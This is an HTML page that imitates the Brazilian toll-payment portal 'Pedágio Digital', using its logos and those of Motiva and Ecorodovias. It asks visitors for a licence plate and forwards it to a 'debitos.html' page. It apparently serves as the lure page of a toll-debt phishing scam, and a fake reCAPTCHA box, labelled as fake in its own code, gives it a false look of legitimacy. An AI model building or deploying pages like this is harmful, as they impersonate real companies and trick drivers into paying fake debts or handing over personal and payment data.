<!DOCTYPE html>
<html lang="pt-br">
<head>
<script type="text/javascript">
    (function(c,l,a,r,i,t,y){
        c[a]=c[a]||function(){(c[a].q=c[a].q||[]).push(arguments)};
        t=l.createElement(r);t.async=1;t.src="https://www.clarity.ms/tag/"+i;
        y=l.getElementsByTagName(r)[0];y.parentNode.insertBefore(t,y);
    })(window, document, "clarity", "script", "uz3k46tian");
</script>
    
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Pedágio Digital</title>
    
    <link rel="preconnect" href="https://fonts.googleapis.com">
    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
    <link href="https://fonts.googleapis.com/css2?family=Ubuntu:wght@300;400;500;700&display=swap" rel="stylesheet">

    <style>
        /* RESET E GERAL */
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
            font-family: 'Ubuntu', sans-serif;
        }

        body {
            min-height: 100vh;
            width: 100%;
            overflow-x: hidden;
            background-color: #000;
            display: flex;
            flex-direction: column;
        }

        /* FUNDO FIXO */
        .background-container {
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            z-index: -1;
            background-image: url('https://images.unsplash.com/photo-1449965408869-eaa3f722e40d?q=80&w=2070&auto=format&fit=crop'); 
            background-size: cover;
            background-position: center;
        }

        .background-overlay {
            position: absolute;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background: linear-gradient(to bottom, rgba(0,0,0,0.7) 0%, rgba(0,0,0,0.9) 100%);
        }

        /* HEADER */
        header {
            display: flex;
            justify-content: space-between;
            align-items: center;
            padding: 20px 5%;
            width: 100%;
            position: relative;
            z-index: 10;
        }

        .logo img {
            height: 35px; 
            width: auto;
        }

        nav ul {
            display: flex;
            align-items: center;
            gap: 20px;
            list-style: none;
        }

        nav a {
            text-decoration: none;
            color: #fff;
            font-size: 14px;
            white-space: nowrap;
        }

        .btn-header {
            border: 1px solid #fff;
            padding: 8px 18px;
            border-radius: 30px;
            font-weight: 500;
        }

        /* HERO SECTION */
        .hero {
            display: flex;
            flex-direction: row;
            justify-content: space-between;
            align-items: center;
            max-width: 1200px;
            margin: 0 auto;
            padding: 40px 5%;
            flex: 1;
            width: 100%;
            position: relative;
            z-index: 2;
        }

        .hero-text {
            max-width: 550px;
            color: #fff;
            text-align: left;
        }

        .hero-text h1 {
            font-size: clamp(32px, 5vw, 52px); /* Responsividade fluida */
            font-weight: 700;
            line-height: 1.1;
            text-transform: uppercase;
        }

        .hero-text .highlight {
            color: #D6F31F;
        }

        .hero-text p {
            font-size: 16px;
            color: #ccc;
            margin-top: 20px;
            font-weight: 300;
        }

        /* CARD */
        .card {
            background-color: #f5f6f8;
            padding: 30px;
            border-radius: 12px;
            width: 100%;
            max-width: 400px;
            box-shadow: 0 15px 35px rgba(0,0,0,0.3);
            margin-left: 20px;
        }

        .card h2 {
            font-size: 18px;
            color: #1a1a1a;
            margin-bottom: 20px;
            font-weight: 400;
            text-align: center;
        }

        input[type="text"] {
            width: 100%;
            padding: 14px;
            background-color: #eef0f2;
            border: 1px solid #ddd;
            border-radius: 6px;
            font-size: 14px;
            font-weight: 600;
            text-transform: uppercase;
            margin-bottom: 15px;
            outline: none;
        }

        .checkbox-group {
            display: flex;
            margin-bottom: 10px;
            font-size: 11px;
            color: #333;
            line-height: 1.3;
        }

        .checkbox-group input { margin-right: 8px; margin-top: 2px; }

        .fake-recaptcha {
            background-color: #f9f9f9;
            border: 1px solid #d3d3d3;
            height: 70px;
            display: flex;
            align-items: center;
            justify-content: space-between;
            padding: 0 10px;
            margin-bottom: 15px;
        }

        .recaptcha-box {
            width: 24px; height: 24px;
            border: 2px solid #c1c1c1;
            background: #fff;
            margin-right: 10px;
            cursor: pointer;
        }

        .btn-submit {
            width: 100%;
            padding: 14px;
            border: none;
            border-radius: 6px;
            font-size: 16px;
            font-weight: 600;
            background-color: #dbe0e6;
            color: #9fa6ad;
            cursor: pointer;
            transition: 0.3s;
        }

        .btn-submit.active {
            background-color: #D6F31F;
            color: #1a1a1a;
        }

        /* SUPORTE E FOOTER */
        .support-bar {
            background-color: #111;
            color: #fff;
            padding: 12px 5%;
            border-bottom: 1px solid #222;
        }

        .support-container {
            max-width: 1200px;
            margin: 0 auto;
            display: flex;
            justify-content: space-between;
            font-size: 14px;
        }

        footer {
            background-color: #212529;
            padding: 20px 5%;
        }

        .footer-container {
            max-width: 1200px;
            margin: 0 auto;
            display: flex;
            justify-content: space-between;
            align-items: center;
            flex-wrap: wrap;
            gap: 20px;
        }

        .footer-left img { height: 30px; }
        .footer-right { display: flex; align-items: center; gap: 20px; }
        .logo-motiva { height: 18px !important; }
        .logo-eco { height: 25px !important; }

        /* --- RESPONSIVIDADE MOBILE --- */
        @media (max-width: 900px) {
            header { padding: 15px 5%; }
            nav ul { gap: 10px; }
            nav a { font-size: 12px; }
            .btn-header { padding: 6px 12px; }

            .hero {
                flex-direction: column;
                text-align: center;
                padding-top: 20px;
            }

            .hero-text {
                max-width: 100%;
                margin-bottom: 30px;
            }

            .hero-text h1 {
                font-size: 36px;
            }

            .card {
                margin-left: 0;
                max-width: 100%;
            }

            .footer-container {
                flex-direction: column;
                text-align: center;
            }

            .footer-right {
                justify-content: center;
            }
        }
    </style>
</head>
<body>

    <div class="background-container">
        <div class="background-overlay"></div>
    </div>

    <header>
        <div class="logo">
            <img src="https://pedagiodigital.com/assets/logo-CWdoJbug.png" alt="Pedágio Digital">
        </div>
        <nav>
            <ul>
                <li><a href="#">Fazer Login</a></li>
                <li><a href="#">Dúvidas</a></li>
                <li><a href="#" class="btn-header">Criar Conta</a></li>
            </ul>
        </nav>
    </header>

    <section class="hero">
        <div class="hero-text">
            <h1>DESFRUTE DE TODA A COMODIDADE DO PEDÁGIO <span class="highlight">DIGITAL</span></h1>
            <p>Uma nova era para o pedágio começou: ágil e digital como tem que ser.</p>
        </div>

        <div class="card">
            <h2>Um <strong>único</strong> lugar para <strong>acessar</strong> e <strong>controlar</strong> seus pagamentos.</h2>
            
            <form id="debtForm">
                <input type="text" id="plateInput" placeholder="DIGITE SUA PLACA" maxlength="7">

                <div class="checkbox-group">
                    <input type="checkbox" id="check1">
                    <label for="check1">Aceito os <a href="#">Termos de Uso</a>.</label>
                </div>

                <div class="checkbox-group">
                    <input type="checkbox" id="check2">
                    <label for="check2">Estou ciente da <a href="#">Política de Privacidade</a>.</label>
                </div>

                <div class="fake-recaptcha">
                    <div style="display:flex; align-items:center;">
                        <div class="recaptcha-box" id="fakeCaptchaBox"></div>
                        <span style="font-size:13px; color:#000;">Não sou um robô</span>
                    </div>
                    <img src="https://www.gstatic.com/recaptcha/api2/logo_48.png" width="25">
                </div>

                <button type="submit" id="submitBtn" class="btn-submit" disabled>Buscar débitos</button>
            </form>
        </div>
    </section>

    <section class="support-bar">
        <div class="support-container">
            <span style="font-weight:700;">Central de atendimento</span>
            <span>▼</span>
        </div>
    </section>

    <footer>
        <div class="footer-container">
            <div class="footer-left">
                <img src="https://pedagiodigital.com/assets/logo-CWdoJbug.png" alt="Pedágio Digital">
            </div>
            <div class="footer-right">
                <img src="https://pedagiodigital.com/assets/logo-motiva-BcheVkaT.svg" class="logo-motiva" alt="Motiva">
                <img src="https://pedagiodigital.com/assets/logo-eco-Cdd8S58B.png" class="logo-eco" alt="Ecorodovias">
            </div>
        </div>
    </footer>

    <script>
        const plateInput = document.getElementById('plateInput');
        const submitBtn = document.getElementById('submitBtn');
        const fakeCaptchaBox = document.getElementById('fakeCaptchaBox');
        let isCaptchaChecked = false;

        plateInput.addEventListener('input', function(e) {
            this.value = this.value.toUpperCase().replace(/[^A-Z0-9]/g, '');
            if(this.value.length === 7) {
                submitBtn.disabled = false;
                submitBtn.classList.add('active');
            } else {
                submitBtn.disabled = true;
                submitBtn.classList.remove('active');
            }
        });

        fakeCaptchaBox.addEventListener('click', function() {
            this.innerHTML = '✓';
            this.style.color = '#009e55';
            this.style.fontSize = '18px';
            this.style.display = 'flex';
            this.style.alignItems = 'center';
            this.style.justifyContent = 'center';
            isCaptchaChecked = true;
        });

        document.getElementById('debtForm').addEventListener('submit', function(e) {
            e.preventDefault();
            if(plateInput.value.length === 7) {
                window.location.href = `debitos.html?plate=${plateInput.value}`;
            }
        });
    </script>
</body>
</html>
